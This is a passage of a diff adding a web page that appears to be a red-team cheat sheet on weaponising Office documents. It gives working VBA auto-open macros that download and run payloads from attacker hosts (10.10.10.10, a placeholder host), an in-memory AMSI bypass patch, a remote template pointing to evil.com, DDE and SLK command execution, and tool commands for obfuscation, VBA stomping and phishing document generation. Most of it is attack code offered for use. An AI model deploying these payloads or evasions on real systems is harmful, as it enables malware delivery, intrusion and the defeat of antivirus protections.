+  <a href="https://github.com/Inf0secRabbit/BadAssMacros">https://github.com/Inf0secRabbit/BadAssMacros</a></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>BadAssMacros.exe -h
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create VBA for classic shellcode injection from raw shellcode</span>
+</span></span><span style="display:flex;"><span>BadAssMacros.exe -i &lt;path_to_raw_shellcode_file&gt; -w &lt;doc/excel&gt; -p no -s classic -c &lt;caesar_shift_value&gt; -o &lt;path_to_output_file&gt;
+</span></span><span style="display:flex;"><span>BadAssMacros.exe -i .\Desktop\payload.bin -w doc -p no -s classic -c <span style="color:#ae81ff">23</span> -o .\Desktop\output.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create VBA for indirect shellcode injection from raw shellcode</span>
+</span></span><span style="display:flex;"><span>BadAssMacros.exe -i &lt;path_to_raw_shellcode_file&gt; -w &lt;doc/excel&gt; -p no -s indirect -o &lt;path_to_output_file&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># List modules inside Doc/Excel file</span>
+</span></span><span style="display:flex;"><span>BadAssMacros.exe -i &lt;path_to_doc/excel_file&gt; -w &lt;doc/excel&gt; -p yes -l
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Purge Doc/Excel file</span>
+</span></span><span style="display:flex;"><span>BadAssMacros.exe -i &lt;path_to_doc/excel_file&gt; -w &lt;doc/excel&gt; -p yes -o &lt;path_to_output_file&gt; -m &lt;module_name&gt;
+</span></span></code></pre></div><h2 id="docm---cactustorch-vba-module">
+  DOCM - CACTUSTORCH VBA Module
+  <a class="anchor" href="#docm---cactustorch-vba-module">#</a>
+</h2>
+<blockquote>
+<p>CactusTorch is leveraging the DotNetToJscript technique to load a .Net compiled binary into memory and execute it from vbscript</p>
+</blockquote>
+<ul>
+<li>
+  <a href="https://github.com/mdsecactivebreach/CACTUSTORCH">https://github.com/mdsecactivebreach/CACTUSTORCH</a></li>
+<li>
+  <a href="https://github.com/tyranid/DotNetToJScript/">https://github.com/tyranid/DotNetToJScript/</a></li>
+<li>CACTUSTORCH - DotNetToJScript all the things - 
+  <a href="https://youtu.be/YiaKb8nHFSY">https://youtu.be/YiaKb8nHFSY</a></li>
+<li>CACTUSTORCH - CobaltStrike Aggressor Script Addon - 
+  <a href="https://www.youtube.com/watch?v=_pwH6a-6yAQ">https://www.youtube.com/watch?v=_pwH6a-6yAQ</a></li>
+</ul>
+<ol>
+<li>Import <strong>.cna</strong> in Cobalt Strike</li>
+<li>Generate a new VBA payload from the CACTUSTORCH menu</li>
+<li>Download DotNetToJscript</li>
+<li>Compile it
+<ul>
+<li><strong>DotNetToJscript.exe</strong> - responsible for bootstrapping C# binaries (supplied as input) and converting them to JavaScript or VBScript</li>
+<li><strong>ExampleAssembly.dll</strong> - the C# assembly that will be given to DotNetToJscript.exe. In default project configuration, the assembly just pops a message box with the text &ldquo;test&rdquo;</li>
+</ul>
+</li>
+<li>Execute <strong>DotNetToJscript.exe</strong> and supply it with the ExampleAssembly.dll, specify the output file and the output type
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>DotNetToJScript.exeExampleAssembly.dll -l vba -o test.vba -c cactusTorch
+</span></span></code></pre></div></li>
+<li>Use the generated code to replace the hardcoded binary in CactusTorch</li>
+</ol>
+<h2 id="docm---mmg-with-custom-dl--exec">
+  DOCM - MMG with Custom DL + Exec
+  <a class="anchor" href="#docm---mmg-with-custom-dl--exec">#</a>
+</h2>
+<ol>
+<li>Custom Download in first Macro to &ldquo;C:\Users\Public\beacon.exe&rdquo;</li>
+<li>Create a custom binary execute using MMG</li>
+<li>Merge both Macro</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>git clone https<span style="color:#960050;background-color:#1e0010">:</span>//github.com/Mr-Un1k0d3r/MaliciousMacroGenerator
+</span></span><span style="display:flex;"><span>python MMG.py configs/generic-cmd.json malicious.vba
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;description&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#e6db74">&#34;Generic command exec payload\nEvasion technique set to none&#34;</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;template&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#e6db74">&#34;templates/payloads/generic-cmd-template.vba&#34;</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;varcount&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">152</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;encodingoffset&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">5</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;chunksize&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">180</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;encodedvars&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> 	{},
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;vars&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> 	[],
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;evasion&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> 	[<span style="color:#e6db74">&#34;encoder&#34;</span>],
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;payload&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#e6db74">&#34;cmd.exe /c C:\\Users\\Public\\beacon.exe&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-vb" data-lang="vb"><span style="display:flex;"><span><span style="color:#66d9ef">Private</span> <span style="color:#66d9ef">Declare</span> PtrSafe <span style="color:#66d9ef">Function</span> <span style="color:#a6e22e">URLDownloadToFile</span> <span style="color:#66d9ef">Lib</span> <span style="color:#e6db74">&#34;urlmon&#34;</span> <span style="color:#66d9ef">Alias</span> <span style="color:#e6db74">&#34;URLDownloadToFileA&#34;</span> (<span style="color:#66d9ef">ByVal</span> pCaller <span style="color:#f92672">As</span> <span style="color:#66d9ef">Long</span>, <span style="color:#66d9ef">ByVal</span> szURL <span style="color:#f92672">As</span> <span style="color:#66d9ef">String</span>, <span style="color:#66d9ef">ByVal</span> szFileName <span style="color:#f92672">As</span> <span style="color:#66d9ef">String</span>, <span style="color:#66d9ef">ByVal</span> dwReserved <span style="color:#f92672">As</span> <span style="color:#66d9ef">Long</span>, <span style="color:#66d9ef">ByVal</span> lpfnCB <span style="color:#f92672">As</span> <span style="color:#66d9ef">Long</span>) <span style="color:#f92672">As</span> <span style="color:#66d9ef">Long</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Public</span> <span style="color:#66d9ef">Function</span> <span style="color:#a6e22e">DownloadFileA</span>(<span style="color:#66d9ef">ByVal</span> URL <span style="color:#f92672">As</span> <span style="color:#66d9ef">String</span>, <span style="color:#66d9ef">ByVal</span> DownloadPath <span style="color:#f92672">As</span> <span style="color:#66d9ef">String</span>) <span style="color:#f92672">As</span> <span style="color:#66d9ef">Boolean</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">On</span> <span style="color:#66d9ef">Error</span> <span style="color:#66d9ef">GoTo</span> Failed
+</span></span><span style="display:flex;"><span>    DownloadFileA <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">&#39;As directory must exist, this is a check
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">If</span> CreateObject(<span style="color:#e6db74">&#34;Scripting.FileSystemObject&#34;</span>).FolderExists(CreateObject(<span style="color:#e6db74">&#34;Scripting.FileSystemObject&#34;</span>).GetParentFolderName(DownloadPath)) <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span> <span style="color:#66d9ef">Then</span> <span style="color:#66d9ef">Exit</span> <span style="color:#66d9ef">Function</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Dim</span> returnValue <span style="color:#f92672">As</span> <span style="color:#66d9ef">Long</span>
+</span></span><span style="display:flex;"><span>    returnValue <span style="color:#f92672">=</span> URLDownloadToFile(0, URL, DownloadPath, 0, 0)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">&#39;If return value is 0 and the file exist, then it is considered as downloaded correctly
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    DownloadFileA <span style="color:#f92672">=</span> (returnValue <span style="color:#f92672">=</span> 0) <span style="color:#f92672">And</span> (Len(Dir(DownloadPath)) <span style="color:#f92672">&gt;</span> 0)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">Exit</span> <span style="color:#66d9ef">Function</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Failed</span>:
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">End</span> <span style="color:#66d9ef">Function</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Sub</span> <span style="color:#a6e22e">AutoOpen</span>()
+</span></span><span style="display:flex;"><span>    DownloadFileA <span style="color:#e6db74">&#34;http://10.10.10.10/macro.exe&#34;</span>, <span style="color:#e6db74">&#34;C:\\Users\\Public\\beacon.exe&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">End</span> <span style="color:#66d9ef">Sub</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Sub</span> <span style="color:#a6e22e">Auto_Open</span>()
+</span></span><span style="display:flex;"><span>    DownloadFileA <span style="color:#e6db74">&#34;http://10.10.10.10/macro.exe&#34;</span>, <span style="color:#e6db74">&#34;C:\\Users\\Public\\beacon.exe&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">End</span> <span style="color:#66d9ef">Sub</span>
+</span></span></code></pre></div><h2 id="docm---activex-based-inkpicture-control-painted-event-autorun-macro">
+  DOCM - ActiveX-based (InkPicture control, Painted event) Autorun macro
+  <a class="anchor" href="#docm---activex-based-inkpicture-control-painted-event-autorun-macro">#</a>
+</h2>
+<p>Go to <strong>Developer tab</strong> on ribbon <code>-&gt; Insert -&gt; More Controls -&gt; Microsoft InkPicture Control</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-vb" data-lang="vb"><span style="display:flex;"><span><span style="color:#66d9ef">Private</span> <span style="color:#66d9ef">Sub</span> <span style="color:#a6e22e">InkPicture1_Painted</span>(<span style="color:#66d9ef">ByVal</span> hDC <span style="color:#f92672">As</span> <span style="color:#66d9ef">Long</span>, <span style="color:#66d9ef">ByVal</span> Rect <span style="color:#f92672">As</span> MSINKAUTLib.IInkRectangle)
+</span></span><span style="display:flex;"><span>Run <span style="color:#f92672">=</span> Shell(<span style="color:#e6db74">&#34;cmd.exe /c PowerShell (New-Object System.Net.WebClient).DownloadFile(&#39;https://&lt;host&gt;/file.exe&#39;,&#39;file.exe&#39;);Start-Process &#39;file.exe&#39;&#34;</span>, vbNormalFocus)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">End</span> <span style="color:#66d9ef">Sub</span>
+</span></span></code></pre></div><h2 id="vba-obfuscation">
+  VBA Obfuscation
+  <a class="anchor" href="#vba-obfuscation">#</a>
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#75715e"># https://www.youtube.com/watch?v=L0DlPOLx2k0</span>
+</span></span><span style="display:flex;"><span>$ git clone https<span style="color:#960050;background-color:#1e0010">:</span>//github.com/bonnetn/vba-obfuscator
+</span></span><span style="display:flex;"><span>$ cat example_macro/download_payload.vba | docker run -i --rm bonnetn/vba-obfuscator /dev/stdin
+</span></span></code></pre></div><h2 id="vba-purging">
+  VBA Purging
+  <a class="anchor" href="#vba-purging">#</a>
+</h2>
+<p><strong>VBA Stomping</strong>: This technique allows attackers to remove compressed VBA code from Office documents and still execute malicious macros without many of the VBA keywords that AV engines had come to rely on for detection. == Removes P-code.</p>
+<p>:warning: VBA stomping is not effective against Excel 97-2003 Workbook (.xls) format.</p>
+<h3 id="officepurge">
+  OfficePurge
+  <a class="anchor" href="#officepurge">#</a>
+</h3>
+<ul>
+<li>
+  <a href="https://github.com/fireeye/OfficePurge/releases/download/v1.0/OfficePurge.exe">https://github.com/fireeye/OfficePurge/releases/download/v1.0/OfficePurge.exe</a></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>OfficePurge.exe -d word <span style="color:#f92672">-f</span> .\malicious.doc -m NewMacros
+</span></span><span style="display:flex;"><span>OfficePurge.exe -d excel <span style="color:#f92672">-f</span> .\payroll.xls -m Module1
+</span></span><span style="display:flex;"><span>OfficePurge.exe -d publisher <span style="color:#f92672">-f</span> .\donuts.pub -m ThisDocument
+</span></span><span style="display:flex;"><span>OfficePurge.exe -d word <span style="color:#f92672">-f</span> .\malicious.doc -l
+</span></span></code></pre></div><h3 id="evilclippy">
+  EvilClippy
+  <a class="anchor" href="#evilclippy">#</a>
+</h3>
+<blockquote>
+<p>Evil Clippy uses the OpenMCDF library to manipulate CFBF files.
+Evil Clippy compiles perfectly fine with the Mono C# compiler and has been tested on Linux, OSX and Windows.
+If you want to manipulate CFBF files manually, then FlexHEX is one of the best editors for this.</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#75715e"># OSX/Linux</span>
+</span></span><span style="display:flex;"><span>mcs /reference<span style="color:#960050;background-color:#1e0010">:</span>OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out<span style="color:#960050;background-color:#1e0010">:</span>EvilClippy.exe *.cs 
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Windows</span>
+</span></span><span style="display:flex;"><span>csc /reference<span style="color:#960050;background-color:#1e0010">:</span>OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out<span style="color:#960050;background-color:#1e0010">:</span>EvilClippy.exe *.cs 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>EvilClippy.exe -s fake.vbs -g -r cobaltstrike.doc
+</span></span><span style="display:flex;"><span>EvilClippy.exe -s fakecode.vba -t 2016x86 macrofile.doc
+</span></span><span style="display:flex;"><span>EvilClippy.exe -s fakecode.vba -t 2013x64 macrofile.doc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># make macro code unaccessible is to mark the project as locked and unviewable: -u</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Evil Clippy can confuse pcodedmp and many other analysis tools with the -r flag.</span>
+</span></span><span style="display:flex;"><span>EvilClippy.exe -r macrofile.doc
+</span></span></code></pre></div><h2 id="vba---offensive-security-template">
+  VBA - Offensive Security Template
+  <a class="anchor" href="#vba---offensive-security-template">#</a>
+</h2>
+<ul>
+<li>Reverse Shell VBA - 
+  <a href="https://github.com/JohnWoodman/VBA-Macro-Reverse-Shell/blob/main/VBA-Reverse-Shell.vba">https://github.com/JohnWoodman/VBA-Macro-Reverse-Shell/blob/main/VBA-Reverse-Shell.vba</a></li>
+<li>Process Dumper - 
+  <a href="https://github.com/JohnWoodman/VBA-Macro-Dump-Process">https://github.com/JohnWoodman/VBA-Macro-Dump-Process</a></li>
+<li>RunPE - 
+  <a href="https://github.com/itm4n/VBA-RunPE">https://github.com/itm4n/VBA-RunPE</a></li>
+<li>Spoof Parent - 
+  <a href="https://github.com/py7hagoras/OfficeMacro64">https://github.com/py7hagoras/OfficeMacro64</a></li>
+<li>AMSI Bypass - 
+  <a href="https://github.com/outflanknl/Scripts/blob/master/AMSIbypasses.vba">https://github.com/outflanknl/Scripts/blob/master/AMSIbypasses.vba</a></li>
+<li>amsiByPassWithRTLMoveMemory - 
+  <a href="https://gist.github.com/DanShaqFu/1c57c02660b2980d4816d14379c2c4f3">https://gist.github.com/DanShaqFu/1c57c02660b2980d4816d14379c2c4f3</a></li>
+<li>VBA macro spawning a process with a spoofed parent - 
+  <a href="https://github.com/christophetd/spoofing-office-macro/blob/master/macro64.vba">https://github.com/christophetd/spoofing-office-macro/blob/master/macro64.vba</a></li>
+</ul>
+<h2 id="vba---amsi">
+  VBA - AMSI
+  <a class="anchor" href="#vba---amsi">#</a>
+</h2>
+<blockquote>
+<p>The Office VBA integration with AMSI is made up of three parts: (a) logging macro behavior, (b) triggering a scan on suspicious behavior, and (c) stopping a malicious macro upon detection. 
+  <a href="https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/">https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/</a></p>
+</blockquote>
+<p>
+  <img src="https://www.microsoft.com/security/blog/wp-content/uploads/2018/09/fig2-runtime-scanning-amsi-8-1024x482.png" alt="" /></p>
+<p>:warning: It appears that p-code based attacks where the VBA code is stomped will still be picked up by the AMSI engine (e.g. files manipulated by our tool EvilClippy).</p>
+<p>The AMSI engine only hooks into VBA, we can bypass it by using Excel 4.0 Macro</p>
+<ul>
+<li>AMSI Trigger - 
+  <a href="https://github.com/synacktiv/AMSI-Bypass">https://github.com/synacktiv/AMSI-Bypass</a></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-vb" data-lang="vb"><span style="display:flex;"><span><span style="color:#66d9ef">Private</span> <span style="color:#66d9ef">Declare</span> PtrSafe <span style="color:#66d9ef">Function</span> <span style="color:#a6e22e">GetProcAddress</span> <span style="color:#66d9ef">Lib</span> <span style="color:#e6db74">&#34;kernel32&#34;</span> (<span style="color:#66d9ef">ByVal</span> hModule <span style="color:#f92672">As</span> LongPtr, <span style="color:#66d9ef">ByVal</span> lpProcName <span style="color:#f92672">As</span> <span style="color:#66d9ef">String</span>) <span style="color:#f92672">As</span> LongPtr
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Private</span> <span style="color:#66d9ef">Declare</span> PtrSafe <span style="color:#66d9ef">Function</span> <span style="color:#a6e22e">LoadLibrary</span> <span style="color:#66d9ef">Lib</span> <span style="color:#e6db74">&#34;kernel32&#34;</span> <span style="color:#66d9ef">Alias</span> <span style="color:#e6db74">&#34;LoadLibraryA&#34;</span> (<span style="color:#66d9ef">ByVal</span> lpLibFileName <span style="color:#f92672">As</span> <span style="color:#66d9ef">String</span>) <span style="color:#f92672">As</span> LongPtr
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Private</span> <span style="color:#66d9ef">Declare</span> PtrSafe <span style="color:#66d9ef">Function</span> <span style="color:#a6e22e">VirtualProtect</span> <span style="color:#66d9ef">Lib</span> <span style="color:#e6db74">&#34;kernel32&#34;</span> (lpAddress <span style="color:#f92672">As</span> Any, <span style="color:#66d9ef">ByVal</span> dwSize <span style="color:#f92672">As</span> LongPtr, <span style="color:#66d9ef">ByVal</span> flNewProtect <span style="color:#f92672">As</span> <span style="color:#66d9ef">Long</span>, lpflOldProtect <span style="color:#f92672">As</span> <span style="color:#66d9ef">Long</span>) <span style="color:#f92672">As</span> <span style="color:#66d9ef">Long</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Private</span> <span style="color:#66d9ef">Declare</span> PtrSafe <span style="color:#66d9ef">Sub</span> <span style="color:#a6e22e">CopyMemory</span> <span style="color:#66d9ef">Lib</span> <span style="color:#e6db74">&#34;kernel32&#34;</span> <span style="color:#66d9ef">Alias</span> <span style="color:#e6db74">&#34;RtlMoveMemory&#34;</span> (Destination <span style="color:#f92672">As</span> Any, Source <span style="color:#f92672">As</span> Any, <span style="color:#66d9ef">ByVal</span> Length <span style="color:#f92672">As</span> LongPtr)
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Private</span> <span style="color:#66d9ef">Sub</span> <span style="color:#a6e22e">Document_Open</span>()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">Dim</span> AmsiDLL <span style="color:#f92672">As</span> LongPtr
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">Dim</span> AmsiScanBufferAddr <span style="color:#f92672">As</span> LongPtr
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">Dim</span> result <span style="color:#f92672">As</span> <span style="color:#66d9ef">Long</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">Dim</span> MyByteArray(6) <span style="color:#f92672">As</span> <span style="color:#66d9ef">Byte</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">Dim</span> ArrayPointer <span style="color:#f92672">As</span> LongPtr
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    MyByteArray(0) <span style="color:#f92672">=</span> 184 <span style="color:#75715e">&#39; 0xB8
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    MyByteArray(1) <span style="color:#f92672">=</span> 87  <span style="color:#75715e">&#39; 0x57
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    MyByteArray(2) <span style="color:#f92672">=</span> 0   <span style="color:#75715e">&#39; 0x00
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    MyByteArray(3) <span style="color:#f92672">=</span> 7   <span style="color:#75715e">&#39; 0x07
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    MyByteArray(4) <span style="color:#f92672">=</span> 128 <span style="color:#75715e">&#39; 0x80
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    MyByteArray(5) <span style="color:#f92672">=</span> 195 <span style="color:#75715e">&#39; 0xC3
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> 
+</span></span><span style="display:flex;"><span>    AmsiDLL <span style="color:#f92672">=</span> LoadLibrary(<span style="color:#e6db74">&#34;amsi.dll&#34;</span>)
+</span></span><span style="display:flex;"><span>    AmsiScanBufferAddr <span style="color:#f92672">=</span> GetProcAddress(AmsiDLL, <span style="color:#e6db74">&#34;AmsiScanBuffer&#34;</span>)
+</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> VirtualProtect(<span style="color:#66d9ef">ByVal</span> AmsiScanBufferAddr, 5, 64, 0)
+</span></span><span style="display:flex;"><span>    ArrayPointer <span style="color:#f92672">=</span> VarPtr(MyByteArray(0))
+</span></span><span style="display:flex;"><span>    CopyMemory <span style="color:#66d9ef">ByVal</span> AmsiScanBufferAddr, <span style="color:#66d9ef">ByVal</span> ArrayPointer, 6
+</span></span><span style="display:flex;"><span>     
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">End</span> <span style="color:#66d9ef">Sub</span>
+</span></span></code></pre></div><h2 id="docx---template-injection">
+  DOCX - Template Injection
+  <a class="anchor" href="#docx---template-injection">#</a>
+</h2>
+<p>:warning: Does not require &ldquo;Enable Macro&rdquo;</p>
+<h3 id="remote-template">
+  Remote Template
+  <a class="anchor" href="#remote-template">#</a>
+</h3>
+<ol>
+<li>A malicious macro is saved in a Word template .dotm file</li>
+<li>Benign .docx file is created based on one of the default MS Word Document templates</li>
+<li>Document from step 2 is saved as .docx</li>
+<li>Document from step 3 is renamed to .zip</li>
+<li>Document from step 4 gets unzipped</li>
+<li><strong>.\word_rels\settings.xml.rels</strong> contains a reference to the template file. That reference gets replaced with a reference to our malicious macro created in step 1. File can be hosted on a web server (http) or webdav (smb).
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;yes&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;Relationships</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://schemas.openxmlformats.org/package/2006/relationships&#34;</span><span style="color:#f92672">&gt;&lt;Relationship</span> <span style="color:#a6e22e">Id=</span><span style="color:#e6db74">&#34;rId1&#34;</span> <span style="color:#a6e22e">Type=</span><span style="color:#e6db74">&#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate&#34;</span> <span style="color:#a6e22e">Target=</span><span style="color:#e6db74">&#34;file:///C:\Users\mantvydas\AppData\Roaming\Microsoft\Templates\Polished%20resume,%20designed%20by%20MOO.dotx&#34;</span> <span style="color:#a6e22e">TargetMode=</span><span style="color:#e6db74">&#34;External&#34;</span><span style="color:#f92672">/&gt;&lt;/Relationships&gt;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;yes&#34;?&gt;</span><span style="color:#f92672">&lt;Relationships</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://schemas.openxmlformats.org/package/2006/relationships&#34;</span><span style="color:#f92672">&gt;&lt;Relationship</span> <span style="color:#a6e22e">Id=</span><span style="color:#e6db74">&#34;rId1&#34;</span> <span style="color:#a6e22e">Type=</span><span style="color:#e6db74">&#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Target=</span><span style="color:#e6db74">&#34;https://evil.com/malicious.dotm&#34;</span> <span style="color:#a6e22e">TargetMode=</span><span style="color:#e6db74">&#34;External&#34;</span><span style="color:#f92672">/&gt;&lt;/Relationships&gt;</span>
+</span></span></code></pre></div></li>
+<li>File gets zipped back up again and renamed to .docx</li>
+</ol>
+<h3 id="template-injections-tools">
+  Template Injections Tools
+  <a class="anchor" href="#template-injections-tools">#</a>
+</h3>
+<ul>
+<li>
+  <a href="https://github.com/JohnWoodman/remoteInjector">https://github.com/JohnWoodman/remoteInjector</a></li>
+<li>
+  <a href="https://github.com/ryhanson/phishery">https://github.com/ryhanson/phishery</a></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>$ phishery -u https<span style="color:#960050;background-color:#1e0010">:</span>//secure.site.local/docs -i good.docx -o bad.docx
+</span></span><span style="display:flex;"><span>[+] Opening Word document<span style="color:#960050;background-color:#1e0010">:</span> good.docx
+</span></span><span style="display:flex;"><span>[+] Setting Word document template to<span style="color:#960050;background-color:#1e0010">:</span> https<span style="color:#960050;background-color:#1e0010">:</span>//secure.site.local/docs
+</span></span><span style="display:flex;"><span>[+] Saving injected Word document to<span style="color:#960050;background-color:#1e0010">:</span> bad.docx
+</span></span><span style="display:flex;"><span>[*] Injected Word document has been saved!
+</span></span></code></pre></div><h2 id="docx---dde">
+  DOCX - DDE
+  <a class="anchor" href="#docx---dde">#</a>
+</h2>
+<ul>
+<li>Insert &gt; QuickPart &gt; Field</li>
+<li>Right Click &gt; Toggle Field Code</li>
+<li><code>{ DDEAUTO c:\\windows\\system32\\cmd.exe &quot;/k calc.exe&quot; }</code></li>
+</ul>
+<h2 id="slk---excel">
+  SLK - Excel
+  <a class="anchor" href="#slk---excel">#</a>
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>ID;P
+</span></span><span style="display:flex;"><span>O;E
+</span></span><span style="display:flex;"><span>NN;NAuto_open;ER101C1;KOut Flank;F
+</span></span><span style="display:flex;"><span>C;X1;Y101;K0;EEXEC(<span style="color:#e6db74">&#34;c:\shell.cmd&#34;</span>)
+</span></span><span style="display:flex;"><span>C;X1;Y102;K0;EHALT()
+</span></span><span style="display:flex;"><span>E
+</span></span></code></pre></div><h2 id="references">
+  References
+  <a class="anchor" href="#references">#</a>
+</h2>
+<ul>
+<li>
+  <a href="https://itm4n.github.io/vba-runpe-part1/">VBA RunPE Part 1 - itm4n</a></li>
+<li>
+  <a href="https://itm4n.github.io/vba-runpe-part2/">VBA RunPE Part 2 - itm4n</a></li>
+<li>
